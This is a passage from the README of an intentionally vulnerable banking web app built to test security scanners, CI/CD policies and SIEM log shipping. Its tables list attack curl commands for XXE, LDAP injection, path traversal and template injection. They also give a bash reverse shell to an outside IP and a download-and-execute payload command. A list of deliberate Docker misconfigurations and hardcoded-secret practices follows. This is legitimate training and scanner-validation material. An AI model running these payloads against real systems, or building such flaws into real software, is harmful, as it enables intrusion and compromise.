| **XXE (XML External Entity)** | `/xml` | `curl -X POST "http://localhost:8888/xml" -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'` | XML parser exploitation to read arbitrary files |
| **LDAP Injection** | `/ldap` | `curl "http://localhost:8888/ldap?user=admin)(|(password=*"` | LDAP query injection for authentication bypass |
| **Path Traversal** | `/file` | `curl "http://localhost:8888/file?name=../../../../etc/passwd"` | Directory traversal to read sensitive system files |
| **Insecure Deserialisation** | `/deserialize` | `curl "http://localhost:8888/deserialize?data=pickle_payload"` | Python pickle deserialisation vulnerability |
| **Template Injection** | `/template` | `curl "http://localhost:8888/template?content={{7*7}}"` | Server-Side Template Injection (SSTI) in Jinja2 |

### Advanced Exploitation Examples (Tomcat Endpoints)

**Note:** These advanced exploitation examples use Tomcat endpoints (port 9999) for enhanced realism and scanner detection.

| Attack Vector | CURL Command | Attack Purpose |
|--------------|-------------|--------|
| **Reverse Shell via Java** | `curl -G "http://localhost:9999/exploit-app/execute" --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'"` | Establishes outbound connection to attacker-controlled server bypassing firewalls |
| **Privilege Escalation Check** | `curl -G "http://localhost:9999/exploit-app/execute" --data-urlencode "cmd=find / -perm -4000 -type f 2>/dev/null"` | Discovers SUID binaries for potential privilege escalation to root access |
| **Memory Enumeration** | `curl -G "http://localhost:9999/exploit-app/execute" --data-urlencode "cmd=ps aux \| grep -i tomcat"` | Enumerates running processes to identify security monitoring tools |
| **Download and Execute Payload** | `curl -G "http://localhost:9999/exploit-app/execute" --data-urlencode "cmd=wget http://wildfire.paloaltonetworks.com/publicapi/test/elf -O /tmp/payload && chmod +x /tmp/payload && /tmp/payload"` | Multi-stage attack downloading and executing external malware sample |

### Complete Flask Endpoint Testing Examples

The following comprehensive testing examples cover all 42 Flask vulnerability endpoints on port 8888:

| Vulnerability Type | Endpoint | CURL Test Command | Expected Response |
|-------------------|----------|-------------------|------------------|
| **SQL Injection** | `/search` | `curl "http://localhost:8888/search?q=test"` | Search query executed: SELECT * FROM users WHERE name LIKE '%test%' |
| **Cross-Site Scripting** | `/comment` | `curl "http://localhost:8888/comment?comment=<script>alert('xss')</script>"` | Your comment: &lt;script&gt;alert('xss')&lt;/script&gt; |
| **LDAP Injection** | `/ldap` | `curl "http://localhost:8888/ldap?user=admin"` | LDAP search filter: (uid=admin) |
| **Insecure Deserialisation** | `/deserialize` | `curl "http://localhost:8888/deserialize?data=test"` | Invalid data format |
| **Server-Side Request Forgery** | `/fetch` | `curl "http://localhost:8888/fetch?url=http://example.com"` | Failed to fetch: http://example.com |
| **XML External Entity** | `/xml` | `curl "http://localhost:8888/xml?data=%3Croot%3Etest%3C%2Froot%3E"` | XML parsed successfully: root - test |
| **HTTP Header Injection** | `/redirect` | `curl "http://localhost:8888/redirect?url=http://example.com"` | Redirecting... |
| **Weak SSL/TLS Configuration** | `/ssl_test` | `curl "http://localhost:8888/ssl_test"` | SSL context configured with weak security settings |
| **Weak Cryptography** | `/hash` | `curl "http://localhost:8888/hash?password=test"` | MD5 hash: 098f6bcd4621d373cade4e832627b4f6 |
| **Weak AES Encryption** | `/encrypt` | `curl "http://localhost:8888/encrypt?data=test"` | Encrypted with static IV: [hex output] |
| **Unauthenticated Key Exchange** | `/keyexchange` | `curl "http://localhost:8888/keyexchange"` | Key exchange performed without entity authentication |
| **Path Traversal** | `/file` | `curl "http://localhost:8888/file?name=../etc/passwd"` | Reading file: /app/data/../etc/passwd |
| **Wildcard Injection** | `/wildcard` | `curl "http://localhost:8888/wildcard?pattern=*"` | Files matching pattern: [file list] |
| **NoSQL Injection** | `/mongo` | `curl "http://localhost:8888/mongo?id=test"` | MongoDB query: db.users.find({'user_id': 'test'}) |
| **Weak Database Authentication** | `/database` | `curl "http://localhost:8888/database?op=config"` | Database configuration: hardcoded credentials |
| **JWT Without Verification** | `/token` | `curl "http://localhost:8888/token?jwt=test"` | Invalid JWT format |
| **Improper Access Control** | `/admin` | `curl "http://localhost:8888/admin"` | Welcome to admin panel! Sensitive admin data here. |
| **JSON Code Injection** | `/json` | `curl "http://localhost:8888/json?data={\"test\":1}"` | JSON processed: {'test': 1} |
| **Information Disclosure** | `/debug` | `curl "http://localhost:8888/debug"` | [Application configuration data] |
| **Insecure Logging** | `/log` | `curl "http://localhost:8888/log/sensitive_data"` | Logged message: sensitive_data |
| **Template Injection** | `/template` | `curl "http://localhost:8888/template?content=test"` | &lt;h1&gt;User Input:&lt;/h1&gt;&lt;div&gt;test&lt;/div&gt; |
| **Improper Exception Handling** | `/exception` | `curl "http://localhost:8888/exception"` | Exception handled (silently) |
| **Weak Random Generation** | `/random` | `curl "http://localhost:8888/random"` | Random token: [predictable value] |
| **None Attribute Access** | `/none` | `curl "http://localhost:8888/none"` | AttributeError: accessing None attributes |
| **CSRF Protection Disabled** | `/transfer` | `curl -X POST "http://localhost:8888/transfer" -d "amount=100"` | Transfer completed (no CSRF protection) |
| **Cleartext Credential Transmission** | `/credentials` | `curl "http://localhost:8888/credentials?user=admin&pass=secret"` | Credentials transmitted in cleartext |
| **ML Model Download Without Integrity** | `/ml_model` | `curl "http://localhost:8888/ml_model?url=test"` | Failed to download model from test |
| **PyTorch Missing Hash Check** | `/pytorch` | `curl "http://localhost:8888/pytorch?model=test"` | PyTorch model loaded without hash verification |
| **TensorFlow Model Security** | `/tensorflow` | `curl "http://localhost:8888/tensorflow?model=test"` | TensorFlow model loaded without integrity verification |
| **Redis Configuration Without SSL** | `/redis` | `curl "http://localhost:8888/redis"` | Redis configured without SSL |
| **Improper Pathname Limitation** | `/download` | `curl "http://localhost:8888/download?file=test"` | Could not read file: /app/downloads/test |
| **HTML Tag Neutralisation Failure** | `/html` | `curl "http://localhost:8888/html?content=<script>alert('xss')</script>"` | &lt;div&gt;User HTML: &lt;script&gt;alert('xss')&lt;/script&gt;&lt;/div&gt; |
| **Uncontrolled Resource Consumption** | `/resource` | `curl "http://localhost:8888/resource?size=1000"` | Generated data of size: 1000000000 bytes |
| **Resource Exhaustion** | `/exhaust` | `curl "http://localhost:8888/exhaust?size=5000"` | Memory allocated: 5000 bytes |
| **Configuration Input Code Injection** | `/config` | `curl "http://localhost:8888/config?param=test"` | Configuration error with: debug=true |
| **Custom URL Scheme Authorisation** | `/custom_scheme` | `curl "http://localhost:8888/custom_scheme?url=test"` | Handling custom URL scheme without proper authorisation |
| **LDAP Anonymous Binding** | `/ldap_anon` | `curl "http://localhost:8888/ldap_anon"` | LDAP configured with anonymous bind |
| **File Permission Vulnerabilities** | `/permissions` | `curl "http://localhost:8888/permissions?file=test&content=data"` | File created with 777 permissions |
| **Insecure IPMI Configuration** | `/ipmi` | `curl "http://localhost:8888/ipmi"` | IPMI configured insecurely |
| **Cleartext Email Transmission** | `/email` | `curl "http://localhost:8888/email?to=test@example.com&msg=test"` | Email sent via unencrypted SMTP |

## CI/CD Integration

### Triggering Security Scans

To trigger CI/CD security scans and test your Cortex Cloud Application policies:

1. The config/localise.yaml file is the recommended change surface for triggering CI/CD security scans
2. **Create pull/merge requests** with changes to trigger your CI/CD pipeline
3. **Monitor scan results** to validate your security policies are detecting the vulnerabilities

### Key Configuration File

config/localise.yaml - The main configuration file for triggering CI/CD scans:
- Contains application branding and localisation settings
- Includes banking service definitions
- Features Australian-specific configuration (phone numbers, date formats)
- Safe to modify for testing purposes without breaking application functionality

Example modifications to trigger scans:
```yaml
# Modify support phone number
support_phone: "+61 3 8123 4567"

# Update banking services descriptions
banking_services:
  - name: "Personal Banking"
    description: "Updated description to trigger CI/CD scan"
```

## Application Structure

```
├── app.py                 # Main Flask application with vulnerable endpoints
├── models.py             # Database models with intentional security flaws
├── config/               # Configuration files
│   ├── localise.yaml    # PRIMARY FILE FOR CI/CD TESTING
│   ├── logging.yaml     # SIEM log shipping configuration
│   └── anomaly_seeds.yaml # Predictable demo anomalies
├── vulnerable_data/      # Hardcoded secrets and vulnerable configurations
│   ├── config.py        # Insecure application configuration
│   └── secrets.py       # Hardcoded API keys and credentials
├── templates/           # Banking-themed UI templates
└── static/             # CSS and JavaScript assets
```

## Vulnerable Endpoints

| Endpoint | Vulnerability Type | Description |
|----------|-------------------|-------------|
| `/search` | SQL Injection | User input directly concatenated into SQL queries |
| `/comment` | Cross-Site Scripting | Unescaped user input reflected in responses |
| `/ping` | Command Injection | User input passed to system commands |
| `/debug` | Information Disclosure | Application configuration and secrets exposed |
| `/log` | Insecure Logging | User input logged without sanitisation |
| `/ldap` | LDAP Injection | User input directly concatenated into LDAP queries |
| `/file` | Path Traversal | Unsafe file path construction with user input |
| `/hash` | Weak Cryptography | MD5 hashing used for passwords |
| `/deserialize` | Insecure Deserialisation | Unsafe pickle deserialisation of user data |

## Security Warnings

**CRITICAL SECURITY NOTICE**

- **DO NOT deploy this application in production environments**
- **DO NOT use with real customer data**
- **DO NOT connect to production databases or systems**
- **Use only in isolated, controlled testing environments**

This repository is intentionally insecure. Deploy only in isolated environments and never expose it to unauthorised access.

## Getting Started

### Prerequisites
- Python 3.11+
- Flask framework
- SQLAlchemy

### Running the Application

#### Option 1: Local Development
```bash
# Application runs on port 5000
# Application available at http://localhost:5000
```

#### Option 2: Docker Hub (Pre-Built Image)
```bash
# Pull and run pre-built image from Docker Hub
docker pull gocortexio/gocortexbrokenbank:latest
docker run -d \
  --name gocortex-broken-bank \
  --restart unless-stopped \
  -p 8888:8888 \
  -p 9999:8080 \
  -e SESSION_SECRET=hardcoded-docker-secret-key \
  -e DATABASE_URL=sqlite:///app/instance/gocortexbrokenbank.db \
  -e FLASK_ENV=production \
  -v ./instance:/app/instance \
  gocortexio/gocortexbrokenbank:latest

# Flask/Gunicorn available at http://localhost:8888
# Tomcat/Java exploits available at http://localhost:9999
```

#### Option 3: Docker Deployment (Build from Source)
```bash
# Using Docker Compose (Recommended)
./deploy.sh

# Or manually:
docker-compose up --build -d

# Flask/Gunicorn available at http://localhost:8888
# Tomcat/Java exploits available at http://localhost:9999
```

#### Option 4: Direct Docker Build
```bash
# Build and run container (exposes both Flask:8888 and Tomcat:9999)
docker build -t gocortex-broken-bank .
docker run -d -p 8888:8888 -p 9999:8080 --name gocortex-broken-bank gocortex-broken-bank
```

#### Option 5: Manual Gunicorn
```bash
# Run directly on port 8888
gunicorn --bind 0.0.0.0:8888 --workers 1 --reload main:app
```

### Localisation Configuration

The application supports multiple locales through the `LOCALE` environment variable:

**Supported Locales:**
- `en` (English/Australian) - Default locale, uses config/localise.yaml
- `kr` (Korean) - Uses config/localise.yaml.kr with Korean translations and Won currency symbol

**Usage:**
```bash
# English/Australian locale (default)
gunicorn --bind 0.0.0.0:5000 main:app

# Korean locale
LOCALE=kr gunicorn --bind 0.0.0.0:5000 main:app

# Docker deployment with Korean locale
LOCALE=kr docker run -d -p 8888:8888 -p 9999:8080 -e LOCALE=kr gocortex-broken-bank
```

**Fallback Behaviour:**
- Unknown locale codes default to English (config/localise.yaml)
- Missing locale files automatically fall back to config/localise.yaml
- Locale is set at application startup (not per-request)

**Locale-Specific Features:**
- Currency symbols ($ for AU, ₩ for KR)
- Date formats and phone number formats
- Banking merchant names (Melbourne-focused for AU, Seoul-focused for KR)
- All UI text and labels fully localised

### SIEM Log Shipping

Version 1.3.0 introduces HTTP POST-based log shipping to external SIEM platforms, enabling real-time security event analysis and demo scenarios with predictable anomalies.

#### Log Types

The application generates three distinct log streams:

| Log Type | Description | Format |
|----------|-------------|--------|
| tomcat_access | Native Tomcat access logs for Java exploit endpoints | Apache Combined Log Format |
| netbank_application | BBWAF security detection events from Flask endpoints | JSON with vendor/product branding |
| netbank_auth | Authentication events (real user activity and simulated traffic) | JSON with simulated flag |

#### Configuration

Log shipping is configured via `config/logging.yaml`:

```yaml
endpoints:
  tomcat_access:
    url: ${LOG_ENDPOINT_TOMCAT_ACCESS}
    auth:
      type: bearer
      token: ${LOG_AUTH_TOMCAT_ACCESS}
  netbank_application:
    url: ${LOG_ENDPOINT_NETBANK_APP}
    auth:
      type: bearer
      token: ${LOG_AUTH_NETBANK_APP}
  netbank_auth:
    url: ${LOG_ENDPOINT_NETBANK_AUTH}
    auth:
      type: bearer
      token: ${LOG_AUTH_NETBANK_AUTH}
```

**Environment Variables:**

| Variable | Purpose |
|----------|---------|
| LOG_ENDPOINT_TOMCAT_ACCESS | HTTP endpoint URL for Tomcat access logs |
| LOG_ENDPOINT_NETBANK_APP | HTTP endpoint URL for BBWAF application logs |
| LOG_ENDPOINT_NETBANK_AUTH | HTTP endpoint URL for authentication logs |
| LOG_AUTH_TOMCAT_ACCESS | Authentication token for tomcat_access endpoint |
| LOG_AUTH_NETBANK_APP | Authentication token for netbank_application endpoint |
| LOG_AUTH_NETBANK_AUTH | Authentication token for netbank_auth endpoint |

**Default URL Fallback:**

If individual endpoint URLs are not set via environment variables, the log shipper falls back to the `defaults` section in `config/logging.yaml`:

```yaml
defaults:
  base_url: "https://api-MYTENANT.xdr.au.paloaltonetworks.com"
  path: "/logs/v1/event"
  product: "xsiam"
```

This allows you to configure a single base URL for all log types when using a unified SIEM endpoint.

**Authentication Methods:**

The `auth.type` field supports:
- `none` - No authentication header
- `header` - Custom header with raw token value (used by XSIAM)
- `basic` - HTTP Basic authentication (base64 encoded)
- `bearer` - Bearer token authentication (Authorization: Bearer token)

Note: Cortex XSIAM uses the `header` type with the API key passed directly in the Authorization header without a "Bearer" prefix.

#### Anomaly Seeding

For demo and testing scenarios, the application seeds predictable anomalies at configurable intervals via `config/anomaly_seeds.yaml`:

```yaml
anomaly_config:
  frequency_minutes: 10

suspicious_ips:
  - ip: "185.220.101.42"
    label: "Known Tor exit node"
    weight: 3
  - ip: "91.240.118.172"
    label: "Brute force origin"
    weight: 2

suspicious_user_agents:
  - agent: "python-requests/2.25.1"
    label: "Scripted access (Python)"
    weight: 3
  - agent: "sqlmap/1.5.2"
    label: "SQL injection tool"
    weight: 1

normal_traffic:
  countries:
    - code: "AU"
      weight: 70
    - code: "KR"
      weight: 20
  success_rate_percent: 92
```

The anomaly seeding injects suspicious IPs and user agents into the simulated traffic stream at the configured frequency. Weights control the probability of each item being selected when an anomaly is injected.

#### Background Traffic Generator

The application includes a background thread that generates simulated authentication traffic:
- Default rate: 4 events per minute (one every 15 seconds)
- Mix of successful and failed login attempts
- Random usernames generated via Faker library
- Periodic anomaly injection based on configured frequency
- All simulated events marked with `simulated: true` flag

#### Log Format Examples

**netbank_auth (JSON):**
```json
{
  "timestamp": "2025-01-15T10:30:45.123Z",
  "event_type": "authentication",
  "username": "johnsmith",
  "action": "login_attempt",
  "success": true,
  "source_ip": "203.45.67.89",
  "user_agent": "Mozilla/5.0...",
  "simulated": false
}
```

**netbank_application (JSON):**
```json
{
  "timestamp": "2025-01-15T10:31:02.456Z",
  "vendor": "GoCortex",
  "product": "BBWAF",
  "event_type": "security_detection",
  "endpoint": "/api/user/lookup",
  "method": "POST",
  "source_ip": "192.168.1.100",
  "detection": "SQL Injection Attempt",
  "severity": "high"
}
```

**tomcat_access (Apache Combined):**
```
203.45.67.89 - - [15/Jan/2025:10:32:15 +0000] "POST /upload HTTP/1.1" 200 1234 "-" "Mozilla/5.0..."
```

#### Cortex XSIAM Setup

To configure log shipping to Palo Alto Networks Cortex XSIAM:

1. Create an HTTP Log Collector in XSIAM:
   - Navigate to Settings - Data Collection - HTTP Log Collector
   - Create a new collector and note the endpoint URL and API key

2. Set environment variables:
   ```bash
   export LOG_ENDPOINT_NETBANK_AUTH="https://api-{tenant}.xdr.{region}.paloaltonetworks.com/logs/v1/event"
   export LOG_AUTH_NETBANK_AUTH="your-xsiam-api-key"
   ```

3. Test connectivity with curl:
   ```bash
   curl -X POST https://api-{tenant}.xdr.{region}.paloaltonetworks.com/logs/v1/event \
     -H 'Authorization: {api_key}' \
     -H 'Content-Type: text/plain' \
     -d '{"test": "connection", "timestamp": 1609100113039}'
   ```

The XSIAM HTTP Log Collector automatically detects JSON format and parses event fields for querying.

### Docker Security Testing

The Dockerfile intentionally violates common container hardening policies to validate IaC and container security controls:

- **Vulnerable Base Image**: Uses Python 3.11-bookworm
- **Insecure Dependencies**: Pinned to vulnerable package versions (Flask 2.0.1, PyJWT 1.7.1, Tomcat 8.5.0, Spring 5.3.0, etc.)
- **Root User**: Runs as root user (security risk)
- **Hardcoded Secrets**: Environment variables with exposed AWS, OpenAI, and other API credentials
- **Excessive Permissions**: World-writable directories (chmod 777)
- **Dual Application Ports**: Exposes port 8888 (Flask/Gunicorn) and port 8080/9999 (Tomcat)
- **No SSL/TLS**: Unencrypted communications
- **Package Vulnerabilities**: Mixed vulnerability detection types:
  - **Direct CVEs**: cryptography 39.0.0 (CVE-2023-23931, CVE-2023-0286), requests, urllib3, Tomcat, Spring Framework
  - **Bundled Dependency CVEs**: psycopg2-binary 2.9.6 (OpenSSL, libpq vulnerabilities in bundled libraries)
  - **Pattern-Based Detection**: PyYAML 6.0 (unsafe_load patterns trigger SAST scanners without direct CVEs)

**Note**: External services (MySQL, PostgreSQL, MongoDB, Redis, LDAP) are **mocked within the Flask application** rather than deployed as separate containers. This provides comprehensive vulnerability testing whilst maintaining a single-container deployment for simplicity.

### IaC Security Testing (Dockerfile.BrokenBank)

The repository includes `Dockerfile.BrokenBank`, a dedicated file containing intentional Infrastructure-as-Code (IaC) misconfigurations for security scanner validation. This file is scanned by IaC security tools but includes a failsafe mechanism that prevents accidental builds.

| Policy Category | Misconfigurations Included | Severity |
|-----------------|---------------------------|----------|
| Certificate Validation Bypasses | curl -k/--insecure, wget --no-check-certificate, pip --trusted-host, PYTHONHTTPSVERIFY=0, NODE_TLS_REJECT_UNAUTHORIZED=0, npm strict-ssl false, git http.sslVerify false | HIGH |
| Package Manager Insecurities | apt --force-yes/--allow-unauthenticated, yum --nogpgcheck, yum sslverify=0, rpm --nosignature, apk --allow-untrusted | HIGH |
| Privilege Escalation | Running as root, sudo usage, chpasswd credential setting | HIGH |
| Hardcoded Credentials | AWS keys, database passwords, API tokens, JWT secrets in ENV | HIGH |
| Missing Security Hardening | No HEALTHCHECK, no WORKDIR, no non-root USER instruction | MEDIUM |
| Base Image Issues | Using :latest tag, deprecated MAINTAINER instruction | MEDIUM |
| Network Exposure | EXPOSE 22 (SSH), database ports exposed | MEDIUM |
| Insecure Patterns | ADD instead of COPY, curl pipe to shell, multiple RUN layers | MEDIUM |

Key Features:
- 30+ distinct IaC policy violations for comprehensive scanner coverage
- Failsafe mechanism prevents accidental container builds
- Vendor-neutral documentation without scanner-specific references
- Covers certificate validation, package managers, credentials, and hardening gaps

#### Container Management
```bash
# View logs
docker logs -f gocortex-broken-bank

# Stop application
docker stop gocortex-broken-bank

# Remove container
docker rm gocortex-broken-bank

# Access container shell
docker exec -it gocortex-broken-bank bash
```

### Kubernetes Deployment

For Kubernetes environments, a deployment manifest is provided in `k8s/gocortexbrokenbank.yaml`. This manifest creates a dedicated namespace and deploys the pre-built Docker Hub image.

```bash
# Deploy to Kubernetes
kubectl apply -f k8s/gocortexbrokenbank.yaml

# Verify deployment
kubectl get pods -n gocortexbrokenbank

# View logs
kubectl logs -f -l app=gocortexbrokenbank -n gocortexbrokenbank

# Access container shell (replace POD_NAME with actual pod name from get pods)
kubectl exec -it POD_NAME -n gocortexbrokenbank -- bash

# Remove deployment
kubectl delete -f k8s/gocortexbrokenbank.yaml
```

The manifest exposes Flask on port 8888 and Tomcat on port 9999 via hostPort bindings. Hardcoded secrets and environment variables are intentional to maintain the vulnerable application profile for security training.

## Licence

This software is provided for **security testing and educational purposes only**. Use in accordance with your organisation's security testing policies and applicable laws.

---

**Remember**: This is a deliberately vulnerable application. Handle with appropriate security controls and never expose to production environments.